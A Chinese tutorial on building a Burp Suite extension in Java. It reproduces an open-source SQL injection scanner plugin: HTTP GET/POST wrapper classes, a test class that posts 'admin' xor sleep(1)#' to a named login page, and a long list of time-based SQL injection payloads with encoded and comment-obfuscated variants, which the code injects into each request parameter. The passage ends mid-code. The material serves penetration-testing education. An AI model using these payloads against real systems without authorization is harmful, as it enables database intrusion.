主要参考文章：
+ [BurpSuite插件开发指南之 API 上篇](
http://www.tuicool.com/articles/aaaa6fA)
+ [BurpSuite插件开发指南之 API 下篇](
http://www.tuicool.com/articles/eU7vUjA)
+ [BurpSuite插件开发指南之Java篇](http://www.php0.net/index.php?a=show&c=index&catid=6&id=19924&m=content)
+ [BurpSuite插件开发指南之 Python 篇](
http://www.tuicool.com/articles/BF7BNzV)

今天主要讲使用Java进行插件的开发。
## 开发步骤 ##
#### 从BurpSuite 程序中导出SDK包文件 ####

![从BurpSuite 程序中导出SDK包文件](http://upload-images.jianshu.io/upload_images/1348446-4244eaf26ed07b18.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

#### 在myeclipse中创建一个Java project ####

![创建一个Java project文件](http://upload-images.jianshu.io/upload_images/1348446-ff8e94cb06222be0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
![将导出的SDK包文件的文件夹放入src文件夹下](http://upload-images.jianshu.io/upload_images/1348446-7a3ff4cc0c4c9e98.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

#### 开始编程 ####

这里主要使用了github上的一个[开源项目的代码](
https://github.com/bsmali4/checkSql)
项目对应的文章：[【技术分享】Burp Suite插件开发之SQL注入检测（已开源）](
http://bobao.360.cn/learning/detail/3176.html)

![项目目录结构](http://upload-images.jianshu.io/upload_images/1348446-c7cbe66fcaf24325.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

** 重要代码和注释解析如下：**
+ Bsmali4Get.java
  - 一个作者自己编写的实现HTTP Get请求的类。

```java
package bsmali4;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;

import org.apache.http.Header;
import org.apache.http.HttpEntity;
import org.apache.http.NameValuePair;
import org.apache.http.StatusLine;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;
import org.omg.CORBA.PUBLIC_MEMBER;

/*封装的http请求*/
public class Bsmali4Get {
	// 参数 1.ip 2.port 3.data
	private String url;
	private String parameters = "";
	private URL realUrl;
	private int TIMEOUT = 5000;
	private HttpGet httpget;
	private CloseableHttpClient httpclient;
	private CloseableHttpResponse httpresponse;
	private Map<String, String> headersmap = new HashMap<String, String>();
	/* 响应信息 */
	private StatusLine resstatus;
	private long reslen;
	private String rescontent;
	private Header[] resheader;

	public Bsmali4Get(String url) {
		this.url = url;
		httpclient = HttpClients.createDefault();
	}

	// 获得参数
	public String getGetparams() {
		return this.parameters;
	}

	// 获得url
	public String getUrl() {
		return this.url;
	}

	// 增加数据
	public void addData(String parameters) {
		if (parameters != null && !parameters.toString().trim().equals("")) {
			if (this.parameters.equals("")) {
				this.parameters = this.parameters + "?" + parameters;
			} else {
				this.parameters = this.parameters + "&" + parameters;
			}
		}
	}

	// 增加文件头,包含cookies
	public void addHeader(String key, String value) {
		this.headersmap.put(key, value);
	}

	// 添加header到http请求
	public void addHeadertoHttp() {
		Iterator<Map.Entry<String, String>> entries = this.headersmap
				.entrySet().iterator();
		while (entries.hasNext()) {
			Entry<String, String> entry = entries.next();
			httpget.addHeader(entry.getKey(), entry.getValue());
		}
	}

	// 获得响应求内容
	public String getResContent() {
		return this.rescontent;
	}

	// 获得响应状态吗
	public StatusLine getResStatus() {
		return this.resstatus;
	}

	// 获得响应内容
	public long getResLen() {
		return this.reslen;
	}

	// 获取响应头
	public Header[] getResHeaders() {
		/*
		 * for(Header h:heads){
		 * System.out.println(h.getName()+":"+h.getValue()); }
		 */
		return this.resheader;
	}

	// 提交请求
	public void doGet() {

		try {
			this.url = this.url + this.parameters;
			this.httpget = new HttpGet(this.url);
			this.addHeadertoHttp();
			this.httpresponse = httpclient.execute(httpget);
			// 获取响应内容 1.状态吗 2.响应httpheader 3.响应内容
			// 打印响应状态
			this.resheader = (Header[]) this.httpresponse.getAllHeaders();
			this.resstatus = this.httpresponse.getStatusLine();
			HttpEntity entity = this.httpresponse.getEntity();
			if (entity != null) {
				// 响应内容长度
				this.reslen = entity.getContentLength();
				// 响应内容
				this.rescontent = EntityUtils.toString(entity);
			}

		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			try {
				this.httpresponse.close();
				this.httpclient.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}

	}
}
```

+ Bsmali4Post.java
  - 一个作者自己编写的实现HTTP Post请求的类。

```java
package bsmali4;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;
import org.apache.http.*;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.omg.CORBA.PUBLIC_MEMBER;

/*封装的http请求*/
public class Bsmali4Post {
	private String rescode;
	// 参数 1.ip 2.port 3.data
	private String url;
	private String parameters = "";
	private URL realUrl;
	private int TIMEOUT = 5000;
	private HttpPost httppost;
	private CloseableHttpClient httpclient;
	private CloseableHttpResponse httpresponse;
	private Map<String, String> headersmap = new HashMap<String, String>();
	// 提交请求参数
	public List<NameValuePair> postparams = new ArrayList<NameValuePair>();

	/* 响应信息 */
	private StatusLine resstatus;
	private long reslen;
	private String rescontent;
	private Header[] resheader;

	public Bsmali4Post(String url) {
		this.url = url;
		httpclient = HttpClients.createDefault();
	}
	//获得postparams
	public  List<NameValuePair> getPostparams()
	{
		return this.postparams;
	}
	
	// 增加数据
	public void addData(String key, String value) {
		if (key != null && !key.toString().trim().equals("") && value != null && !value.toString().trim().equals("")) {
			this.postparams.add(new BasicNameValuePair(key, value));
		}
	}

	// 增加文件头,包含cookies
	public void addHeader(String key, String value) {
		this.headersmap.put(key, value);
	}

	// 添加header到http请求
	public void addHeadertoHttp() {
		Iterator<Map.Entry<String, String>> entries = this.headersmap.entrySet().iterator();
		while (entries.hasNext()) {
			Entry<String, String> entry = entries.next();
			httppost.addHeader(entry.getKey(), entry.getValue());
		}
	}

	// 增加数据到http请求
	public void addDatatoHttp() {
		if (this.postparams.size() > 0) {
			try {
				UrlEncodedFormEntity uefEntity = new UrlEncodedFormEntity(this.postparams, "UTF-8");
				this.httppost.setEntity(uefEntity);
			} catch (UnsupportedEncodingException e) {
				System.out.println("444");
				e.printStackTrace();
			}
		}
	}

	// 设置响应编码
	public void setResCode(String code) {
		if (code.equals("UTF-8") && code.equals("utf-8")) {
			this.rescode = "UTF-8";
		} else if (code.equals("GBK") && code.equals("gbk")) {
			this.rescode = "GBK";
		} else {
			this.rescode = "UTF-8";
		}
	}

	public String getResCode() {
		return this.rescode;
	}

	// 获得响应求内容
	public String getResContent() {
		return this.rescontent;
	}

	// 获得响应状态吗
	public StatusLine getResStatus() {
		return this.resstatus;
	}

	// 获得响应内容
	public long getResLen() {
		return this.reslen;
	}

	// 获取响应头
	public Header[] getResHeaders() {
		/*
		 * for(Header h:heads){
		 * System.out.println(h.getName()+":"+h.getValue()); }
		 */
		return this.resheader;
	}

	// 提交请求
	public void doPost() {
		try {
			this.httppost = new HttpPost(this.url);
			this.addHeadertoHttp();
			this.addDatatoHttp();
			this.httpresponse = httpclient.execute(httppost);
			// 获取响应内容 1.状态吗 2.响应httpheader 3.响应内容
			// 打印响应状态
			this.resheader = (Header[]) this.httpresponse.getAllHeaders();
			this.resstatus = this.httpresponse.getStatusLine();
			HttpEntity entity = this.httpresponse.getEntity();
			if (entity != null) {
				// 响应内容长度
				this.reslen = entity.getContentLength();
				// 响应内容
				this.rescontent = EntityUtils.toString(entity, this.rescode);
			}

		} catch (Exception e) {
			e.printStackTrace();
			System.out.println("222");
		} finally {
			try {
				this.httpresponse.close();
				this.httpclient.close();
			} catch (IOException e) {
				System.out.println("333");
				e.printStackTrace();
			}
		}

	}
}
```

+ Main.java
 - 一个作者写的用来在myeclipse中测试前面两个类的主类。

```java
package bsmali4;

import org.apache.http.Header;

public class Main {

	/**
	 * @param args
	 */
	public static void main(String[] args) {
		testPost();

	}

	// get请求
	public void testGet() {
		Bsmali4Get httpGet = new Bsmali4Get(
				"http://www.baidu.com");
		httpGet.doGet();
		System.out.println(httpGet.getResStatus());
		System.out.println(httpGet.getResLen());
		System.out.println(httpGet.getResContent());
		for (Header header : httpGet.getResHeaders()) {
			System.out.println(header.getName() + ":" + header.getValue());
		}
	}

	// post请求
	public static void testPost() {
		long startTime=System.currentTimeMillis();
		Bsmali4Post httpPost = new Bsmali4Post(
				"http://web.sycsec.com:80/a2274e0e500459f7/login.php");
		httpPost.addHeader("Accept-Encoding", "identity");
		httpPost.addData("username", "admin' xor sleep(1)#");
		httpPost.addData("password", "x");
		httpPost.addData("debug", "1");
		//httpPost.setResCode("utf-8");
		// httpPost.addHeader("redirect_to",
		// "http://www.codersec.net/wp-admin/&testcookie=1");
		httpPost.doPost();
		System.out.println(httpPost.getResStatus());
		System.out.println(httpPost.getResLen());
		System.out.println(httpPost.getResContent());
		for (Header header : httpPost.getResHeaders()) {
			System.out.println(header.getName() + ":" + header.getValue());
		}
		long endTime=System.currentTimeMillis();
		System.out.println((endTime - startTime));
	}
}
```
+ HttpParameter.java
 - 一个用来保存Http中的参数的类，代码如下：

```java
package sqlinject;

public class HttpParameter {
	private String key;
	private String value;

	public HttpParameter(String key, String value) {
		this.key = key;//参数名
		this.value = value;//该参数对应的参数值
	}

	public String getKey() {
		return key;
	}

	public void setKey(String key) {
		this.key = key;
	}

	public String getValue() {
		return value;
	}

	public void setValue(String value) {
		this.value = value;
	}
}
```

+ SQLINJECT.java
  - 实现SQL注入检测的类，代码如下：

```java
package sqlinject;

import java.util.List;

import org.apache.http.Header;
import org.apache.http.NameValuePair;
import org.omg.CORBA.PUBLIC_MEMBER;

import bsmali4.Bsmali4Get;
import bsmali4.Bsmali4Post;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IParameter;

import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;

public class SQLINJECT {
	static List<String> payloads;
	static String cookies = "";
	static final int TIMEOUT = 5000;

	// 初始化payloads
	public static List<String> initpayload(boolean refresh) {
		if (refresh) {
			payloads = null;
		}
		if (payloads != null)
			return payloads;
		else {
			payloads = new ArrayList<String>();
			// payloads.add("' xor sleep()#");
			int timeout = 5;
			payloads.add("' and sleep(" + timeout + ")#");
			payloads.add("' xor sleep(" + timeout + ")#");
			payloads.add("' or sleep(" + timeout + ")");
			payloads.add("' and sleep(" + timeout + ")#");
			payloads.add("' xor sleep(" + timeout + ")#");
			payloads.add("' or sleep(" + timeout + ")#");
			payloads.add("' and sleep(" + timeout + ")--");
			payloads.add("' xor sleep(" + timeout + ")--");
			payloads.add("' or sleep(" + timeout + ")--");
			payloads.add("') and sleep(" + timeout + ") or ('a'='a");
			payloads.add("') xor sleep(" + timeout + ") or ('a'='a");
			payloads.add("') and sleep(" + timeout + ") or ('a'='a");
			payloads.add("^sleep(" + timeout + ")^'");
			payloads.add("'^sleep(" + timeout + ")^'");
			payloads.add("^sleep(" + timeout + ")#");
			payloads.add("'^sleep(" + timeout + ")#");
			payloads.add("'^sleep(" + timeout + ")--");
			payloads.add("^sleep(" + timeout + ")--");
			payloads.add("' or sleep(" + timeout + ") or '1'='1'--");
			payloads.add("' and sleep(" + timeout + ") or '1'='1'--");
			payloads.add("' xor sleep(" + timeout + ") or '1'='1'--");
			payloads.add("' or sleep(" + timeout + ") or ''='");
			payloads.add("\" or sleep(" + timeout + ") or \"\"=\"");
			payloads.add("\" sleep(" + timeout + ") or \"a\"=\"a");
			payloads.add("\" and sleep(" + timeout + ") or 1=1 --");
			payloads.add("' and sleep(" + timeout + ") or 1=1 --");
			payloads.add("' and sleep(" + timeout + ") or 'a'='a");
			payloads.add("') or sleep(" + timeout + ") or ('a'='a");
			payloads.add("\") or sleep(" + timeout + ") or (\"a\"=\"a");
			payloads.add("'admin' or sleep(" + timeout + ") or 'x'='x';");
			payloads.add(" and sleep(" + timeout + ")#");
			payloads.add(" xor sleep(" + timeout + ")#");
			payloads.add(" xor sleep(" + timeout + ")#");
			payloads.add(" or sleep(" + timeout + ")");
			payloads.add(" and sleep(" + timeout + ")#");
			payloads.add(" xor sleep(" + timeout + ")#");
			payloads.add(" or sleep(" + timeout + ")#");
			payloads.add(" and sleep(" + timeout + ")--");
			payloads.add(" xor sleep(" + timeout + ")--");
			payloads.add(" or sleep(" + timeout + ")--");
			payloads.add(") and sleep(" + timeout + ") or ('a'='a");
			payloads.add(") xor sleep(" + timeout + ") or ('a'='a");
			payloads.add(") and sleep(" + timeout + ") or ('a'='a");
			payloads.add("^sleep(" + timeout + ")^");
			payloads.add("^sleep(" + timeout + ")^'");
			payloads.add("^sleep(" + timeout + ")#");
			payloads.add("^sleep(" + timeout + ")#");
			payloads.add("^sleep(" + timeout + ")--");
			payloads.add("^sleep(" + timeout + ")--");
			payloads.add(" or sleep(" + timeout + ") or '1'='1'--");
			payloads.add(" and sleep(" + timeout + ") or '1'='1'--");
			payloads.add(" xor sleep(" + timeout + ") or '1'='1'--");
			payloads.add(" or sleep(" + timeout + ") or ''='");
			payloads.add("%20xor%20sleep(" + timeout +")--");
			payloads.add("%27%20or%20sleep(" + timeout + ")%23");
			payloads.add("%27%20and%20sleep(" + timeout + ")--");
			payloads.add("%27%20xor%20sleep(" + timeout + ")--");
			payloads.add("%27%20or%20sleep(" + timeout + ")--");
			payloads.add("%27)%20and%20sleep(" + timeout + ")%20or%20(%27a%27=%27a");
			payloads.add("%27)%20xor%20sleep(" + timeout + ")%20or%20(%27a%27=%27a");
			payloads.add("%27)%20and%20sleep(" + timeout + ")%20or%20(%27a%27=%27a");
			payloads.add("^sleep(" + timeout + ")^%27");
			payloads.add("%27^sleep(" + timeout + ")^%27");
			payloads.add("^sleep(" + timeout + ")%23");
			payloads.add("%27^sleep(" + timeout + ")%23");
			payloads.add("%27^sleep(" + timeout + ")--");
			payloads.add("^sleep(" + timeout + ")--");
			payloads.add("%27%20or%20sleep(" + timeout + ")%20or%20%271%27=%271%27--");
			payloads.add("%27%20and%20sleep(" + timeout + ")%20or%20%271%27=%271%27--");
			payloads.add("%27%20xor%20sleep(" + timeout + ")%20or%20%271%27=%271%27--");
			payloads.add("%27%20or%20sleep(" + timeout + ")%20or%20%27%27=%27");
			payloads.add("%22%20or%20sleep(" + timeout + ")%20or%20%22%22=%22");
			payloads.add("%22%20sleep(" + timeout + ")%20or%20%22a%22=%22a");
			payloads.add("%22%20and%20sleep(" + timeout + ")%20or%201=1 --");
			payloads.add("%27%20and%20sleep(" + timeout + ")%20or%201=1 --");
			payloads.add("%27%20and%20sleep(" + timeout + ")%20or%20%27a%27=%27a");
			payloads.add("%27)%20or%20sleep(" + timeout + ")%20or%20(%27a%27=%27a");
			payloads.add("%22)%20or%20sleep(" + timeout + ")%20or%20(%22a%22=%22a");
			payloads.add("%27admin%27%20or%20sleep(" + timeout + ")%20or%20%27x%27=%27x%27;");
			payloads.add("%20and%20sleep(" + timeout + ")#");
			payloads.add("%20xor%20sleep(" + timeout + ")#");
			payloads.add("%20xor%20sleep(" + timeout + ")#");
			payloads.add("%20or%20sleep(" + timeout + ")");
			payloads.add("%20and%20sleep(" + timeout + ")#");
			payloads.add("%20xor%20sleep(" + timeout + ")#");
			payloads.add("%20or%20sleep(" + timeout + ")#");
			payloads.add("%20and%20sleep(" + timeout + ")--");
			payloads.add("%20xor%20sleep(" + timeout + ")--");
			payloads.add("%20or%20sleep(" + timeout + ")--");
			payloads.add(")%20and%20sleep(" + timeout + ")%20or%20('a'='a");
			payloads.add(")%20xor%20sleep(" + timeout + ")%20or%20('a'='a");
			payloads.add(")%20and%20sleep(" + timeout + ")%20or%20('a'='a");
			payloads.add("^sleep(" + timeout + ")^");
			payloads.add("^sleep(" + timeout + ")^'");
			payloads.add("^sleep(" + timeout + ")#");
			payloads.add("^sleep(" + timeout + ")#");
			payloads.add("^sleep(" + timeout + ")--");
			payloads.add("^sleep(" + timeout + ")--");
			payloads.add("%20or%20sleep(" + timeout + ")%20or%20'1'='1'--");
			payloads.add("%20and%20sleep(" + timeout + ")%20or%20'1'='1'--");
			payloads.add("%20xor%20sleep(" + timeout + ")%20or%20'1'='1'--");
			payloads.add("%20or%20sleep(" + timeout + ")%20or%20''='");
			payloads.add("'/**/and/**/sleep("+ timeout + ")#");
			payloads.add("'/**/xor/**/sleep("+ timeout + ")#");
			payloads.add("'/**/or/**/sleep(" + timeout + ")");
			payloads.add("'/**/and/**/sleep(" + timeout + ")#");
			payloads.add("'/**/xor/**/sleep(" + timeout + ")#");
			payloads.add("'/**/or/**/sleep(" + timeout + ")#");
			payloads.add("'/**/and/**/sleep(" + timeout + ")--");
			payloads.add("'/**/xor/**/sleep(" + timeout + ")--");
			payloads.add("'/**/or/**/sleep(" + timeout + ")--");
			payloads.add("')/**/and/**/sleep(" + timeout + ")/**/or/**/('a'='a");
			payloads.add("')/**/xor/**/sleep(" + timeout + ")/**/or/**/('a'='a");
			payloads.add("')/**/and/**/sleep(" + timeout + ")/**/or/**/('a'='a");
			payloads.add("^sleep(" + timeout + ")^'");
			payloads.add("'^sleep(" + timeout + ")^'");
			payloads.add("^sleep(" + timeout + ")#");
			payloads.add("'^sleep(" + timeout + ")#");
			payloads.add("'^sleep(" + timeout + ")--");
			payloads.add("^sleep(" + timeout + ")--");
			payloads.add("'/**/or/**/sleep(" + timeout + ")/**/or/**/'1'='1'--");
			payloads.add("'/**/and/**/sleep(" + timeout + ")/**/or/**/'1'='1'--");
			payloads.add("'/**/xor/**/sleep(" + timeout + ")/**/or/**/'1'='1'--");
			payloads.add("'/**/or/**/sleep(" + timeout + ")/**/or/**/''='");
			payloads.add("\"/**/or/**/sleep(" + timeout + ")/**/or/**/\"\"=\"");
			payloads.add("\"/**/sleep(" + timeout + ")/**/or/**/\"a\"=\"a");
			payloads.add("\"/**/and/**/sleep(" + timeout + ")/**/or/**/1=1 --");
			payloads.add("'/**/and/**/sleep(" + timeout + ")/**/or/**/1=1 --");
			payloads.add("'/**/and/**/sleep(" + timeout + ")/**/or/**/'a'='a");
			payloads.add("')/**/or/**/sleep(" + timeout + ")/**/or/**/('a'='a");
			payloads.add("\")/**/or/**/sleep(" + timeout + ")/**/or/**/(\"a\"=\"a");
			payloads.add("'admin'/**/or/**/sleep(" + timeout + ")/**/or/**/'x'='x';");
			payloads.add("/**/and/**/sleep(" + timeout + ")#");
			payloads.add("/**/xor/**/sleep(" + timeout + ")#");
			payloads.add("/**/xor/**/sleep(" + timeout + ")#");
			payloads.add("/**/or/**/sleep(" + timeout + ")");
			payloads.add("/**/and/**/sleep(" + timeout + ")#");
			payloads.add("/**/xor/**/sleep(" + timeout + ")#");
			payloads.add("/**/or/**/sleep(" + timeout + ")#");
			payloads.add("/**/and/**/sleep(" + timeout + ")--");
			payloads.add("/**/xor/**/sleep(" + timeout + ")--");
			payloads.add("/**/or/**/sleep(" + timeout + ")--");
			payloads.add(")/**/and/**/sleep(" + timeout + ")/**/or/**/('a'='a");
			payloads.add(")/**/and sleep(" + timeout + ")/**/or/**/('a'='a");
			payloads.add("/**/or/**/sleep(" + timeout + ")/**/or/**/'1'='1'--");
			payloads.add("/**/and/**/sleep(" + timeout + ")/**/or/**/'1'='1'--");
			payloads.add("/**/xor/**/sleep(" + timeout + ")/**/or/**/'1'='1'--");
			payloads.add("/**/or/**/sleep(" + timeout + ")/**/or/**/''='");
			return payloads;
		}
	}

	public static void checkPostSqlinject(
			IHttpRequestResponse baseRequestResponse,
			IExtensionHelpers helpers, PrintWriter stdout) {
		/* 初始化payload */
		initpayload(false);
		/* 构造，并且发送payload */
		List<String> headerStrings = new ArrayList<String>();
		List<IParameter> parameters = new ArrayList<IParameter>();
		List<HttpParameter> Httpparameter = new ArrayList<HttpParameter>();// 参数list
		URL url = helpers.analyzeRequest(baseRequestResponse).getUrl();
		headerStrings = helpers.analyzeRequest(baseRequestResponse)
				.getHeaders();
		parameters = helpers.analyzeRequest(baseRequestResponse)
				.getParameters();
		stdout.println("coded by bsmali4");
		for (String header : headerStrings) {
			if (header.contains(":")) {
				String[] headerArrayStrings = header.split(":");
				if (headerArrayStrings[0].trim().equals("Cookie")) {
					cookies = headerArrayStrings[1];
				}
			}
		}
		// 获取参数
		for (IParameter parameter : parameters) {
			if (cookies != null && !cookies.trim().equals("")) {
				if (!cookies.contains(parameter.getName())) {
					Httpparameter.add(new HttpParameter(parameter.getName(),
							parameter.getValue()));
				}
			} else {
				Httpparameter.add(new HttpParameter(parameter.getName(),
						parameter.getValue()));
			}

		}

		for (String payload : payloads) {
			for (int i = 0; i < Httpparameter.size(); i++) {
				final Bsmali4Post httpPost = new Bsmali4Post(url.toString());
				// HEADER
				for (String header : headerStrings) {
					if (header.contains(":")) {
						String[] headerArrayStrings = header.split(":");
						if (headerArrayStrings[0].trim().equals("User-Agent")) {
							httpPost.addHeader(headerArrayStrings[0],
									headerArrayStrings[1]);
						} else if (headerArrayStrings[0].trim()
								.equals("Accept")) {
							httpPost.addHeader(headerArrayStrings[0],
									headerArrayStrings[1]);
						} else if (headerArrayStrings[0].trim().equals(
								"Accept-Language")) {
							httpPost.addHeader(headerArrayStrings[0],
									headerArrayStrings[1]);
						} else if (headerArrayStrings[0].trim().equals(
								"Accept-Encoding")) {
							httpPost.addHeader(headerArrayStrings[0],
									headerArrayStrings[1]);
						} else if (headerArrayStrings[0].trim()
								.equals("Cookie")) {
							httpPost.addHeader(headerArrayStrings[0],
									headerArrayStrings[1]);
						}
					}
				}
				for (int j = 0; j < Httpparameter.size(); j++) {
					if (i == j) {
						httpPost.addData(Httpparameter.get(j).getKey(),
								Httpparameter.get(j).getValue() + payload);
					} else {
						httpPost.addData(Httpparameter.get(j).getKey(),
								Httpparameter.get(j).getValue());
					}
				}
				long startTime = System.currentTimeMillis();
				// stdout.println("====start=====");
				Thread t1 = new Thread() {
					public void run() {
						httpPost.doPost();
					};
				};
				t1.start();
				try {
					t1.join();
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
				//stdout.println(httpPost.getResContent());
				long endTime = System.currentTimeMillis();
				if ((endTime - startTime) > TIMEOUT) {
					stdout.println("===========================================");
					stdout.println("=========this**found**a**sqlinject=========");
					for (String header : headerStrings) {
						stdout.println(header);
					}
					for (NameValuePair parameter : httpPost.getPostparams()) {
						stdout.println(parameter.getName() + ":"
								+ parameter.getValue());
					}
					stdout.println("===========================================");
					stdout.println();
					// stdout.println(httpPost.getResContent());
				}
			}
		}

	}

	public static void checkGetSqlinject(
			IHttpRequestResponse baseRequestResponse,
			IExtensionHelpers helpers, PrintWriter stdout) {
		/* 初始化payload */
		initpayload(false);
		/* 构造，并且发送payload */
		List<String> headerStrings = new ArrayList<String>();
		List<IParameter> parameters = new ArrayList<IParameter>();
		List<HttpParameter> Httpparameter = new ArrayList<HttpParameter>();// 参数list
		URL httpurl = helpers.analyzeRequest(baseRequestResponse).getUrl();
		headerStrings = helpers.analyzeRequest(baseRequestResponse)
				.getHeaders();
		parameters = helpers.analyzeRequest(baseRequestResponse)
				.getParameters();
		/* 发送get包 */
		stdout.println("coded by bsmali4");
		for (String header : headerStrings) {
			if (header.contains(":")) {
				String[] headerArrayStrings = header.split(":");
				if (headerArrayStrings[0].trim().equals("Cookie")) {
					cookies = headerArrayStrings[1];
				}
			}
		}
		//stdout.println(cookies);
		// 获取参数
		for (IParameter parameter : parameters) {
			if (cookies != null && !cookies.trim().equals("")) {
				if (!cookies.contains(parameter.getName())) {
					Httpparameter.add(new HttpParameter(parameter.getName(),
							parameter.getValue()));
				}
			} else {
				Httpparameter.add(new HttpParameter(parameter.getName(),
						parameter.getValue()));
			}

		}
		
		for (String payload : payloads) {
			for (int i = 0; i < Httpparameter.size(); i++) {
				int endindex = httpurl.toString().indexOf("?");
				if (endindex == -1)
					return;
				String url = httpurl.toString().substring(0, endindex);								
				final Bsmali4Get httpGet = new Bsmali4Get(url.toString());
				// HEADER				
				for (String header : headerStrings) {
					if (header.contains(":")) {
						String[] headerArrayStrings = header.split(":");
						if (headerArrayStrings[0].trim().equals("User-Agent")) {
							httpGet.addHeader(headerArrayStrings[0],
									headerArrayStrings[1]);
						} else if (headerArrayStrings[0].trim()
								.equals("Accept")) {
							httpGet.addHeader(headerArrayStrings[0],
									headerArrayStrings[1]);
						} else if (headerArrayStrings[0].trim().equals(
								"Accept-Language")) {
							httpGet.addHeader(headerArrayStrings[0],
									headerArrayStrings[1]);
						} else if (headerArrayStrings[0].trim().equals(
								"Accept-Encoding")) {
							httpGet.addHeader(headerArrayStrings[0],
									headerArrayStrings[1]);
						} else if (headerArrayStrings[0].trim()
								.equals("Cookie")) {
							httpGet.addHeader(headerArrayStrings[0],
									headerArrayStrings[1]);
						}
					}
				}			
				for (int j = 0; j < Httpparameter.size(); j++) {
					if (i == j) {
						httpGet.addData(Httpparameter.get(j).getKey() + "=" + Httpparameter.get(j).getValue() + payload);
					} else {
						httpGet.addData(Httpparameter.get(j).getKey() + "=" + Httpparameter.get(j).getValue());
					}
				}
				long startTime = System.currentTimeMillis();
				// stdout.println("====start=====");
				Thread t1 = new Thread() {
					public void run() {
						httpGet.doGet();
					};
				};
				t1.start();
				try {
					t1.join();
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
				//stdout.println(httpGet.getResContent());
				long endTime = System.currentTimeMillis();
				if ((endTime - startTime) > TIMEOUT) {
					stdout.println("===========================================");
					stdout.println("=========this**found**a**sqlinject=========");
					for (String header : headerStrings) {
						stdout.println(header);
					}					
						stdout.println(httpGet.getGetparams());
					stdout.println("===========================================");
					stdout.println();
					// stdout.println(httpPost.getResContent());
				}
			}

	}

	}
}
```
+ FuzzVul.java
  - 使用BurpSuite提供的API来获取http请求的参数等，使用SQLINJECT类提供的方法来进行SQL注入检测。

```java
package bsmali4;

import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

import sqlinject.SQLINJECT;
import sqlinject.SQLINJECT_BAKS;

import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IParameter;
import burp.IRequestInfo;

public class FuzzVul {

	public static void checkPost(IHttpRequestResponse baseRequestResponse,
			IExtensionHelpers helpers, PrintWriter stdout) {
		List<String> headerStrings = new ArrayList<String>();
		List<IParameter> parameters = new ArrayList<IParameter>();
		URL url = helpers.analyzeRequest(baseRequestResponse).getUrl();
		byte contenttype = helpers.analyzeRequest(baseRequestResponse)
				.getContentType();
		headerStrings = helpers.analyzeRequest(baseRequestResponse)
				.getHeaders();
		parameters = helpers.analyzeRequest(baseRequestResponse)
				.getParameters();
		// stdout.println(url.toString());
		// stdout.println(contenttype);
		// stdout.println(helpers.analyzeRequest(baseRequestResponse).getMethod());
		// stdout.println(headerStrings);
		// print 函数
		/*
		 * for (int i = 0; i < parameters.size(); i++) { IParameter parameter =
		 * parameters.get(i); stdout.println(parameter.getName() + ":" +
		 * parameter.getValue()); }
		 */
		switch (contenttype) {
		case IRequestInfo.CONTENT_TYPE_URL_ENCODED:
			checkURLENCODEDPost(baseRequestResponse, helpers, stdout);
			break;

		default:
			break;
		}

	}

	/* 根据post内容的类型来分工 */
	/* AMF类型 */
	private static void checkAMFPost() {

	}

	/* JSON类型 */
	private static void checkJSONPost() {

	}

	/* MULTIPART类型 */
	private static void checkMULTIPARTPost() {

	}

	/* NONE类型 */
	private static void checkNONEPost() {

	}

	/* UNKNOWN类型 */
	private static void checkUNKNOWNPost(
			IHttpRequestResponse baseRequestResponse,
			IExtensionHelpers helpers, PrintWriter stdout) {
		// SQLINJECT.checkPostSqlinject(baseRequestResponse, helpers, stdout);
		// SQLINJECT.checkPostSqlinject(baseRequestResponse, helpers, stdout);

	}

	/* URL_ENCODED类型 */
	private static void checkURLENCODEDPost(
			IHttpRequestResponse baseRequestResponse,
			IExtensionHelpers helpers, PrintWriter stdout) {
		SQLINJECT.checkPostSqlinject(baseRequestResponse, helpers, stdout);
	}

	/* XML类型 */
	private static void checkXMLPost() {

	}

	/* 检查get方法 */
	public static void checkGet(IHttpRequestResponse baseRequestResponse,
			IExtensionHelpers helpers, PrintWriter stdout) {
		List<String> headerStrings = new ArrayList<String>();
		List<IParameter> parameters = new ArrayList<IParameter>();
		URL url = helpers.analyzeRequest(baseRequestResponse).getUrl();
		byte contenttype = helpers.analyzeRequest(baseRequestResponse)
				.getContentType();
		headerStrings = helpers.analyzeRequest(baseRequestResponse)
				.getHeaders();
		parameters = helpers.analyzeRequest(baseRequestResponse)
				.getParameters();
		//stdout.println(url.toString());
		//stdout.println(contenttype);
		//stdout.println(helpers.analyzeRequest(baseRequestResponse).getMethod());
		//stdout.println(headerStrings);
		/*
		 * print 函数 for (int i = 0; i < parameters.size(); i++) { IParameter
		 * parameter = parameters.get(i); stdout.println(parameter.getName() +
		 * ":" + parameter.getValue()); }
		 */
		switch (contenttype) {
		case IRequestInfo.CONTENT_TYPE_URL_ENCODED:
			checkURLENCODEDGet(baseRequestResponse, helpers, stdout);
			break;
		case IRequestInfo.CONTENT_TYPE_NONE:
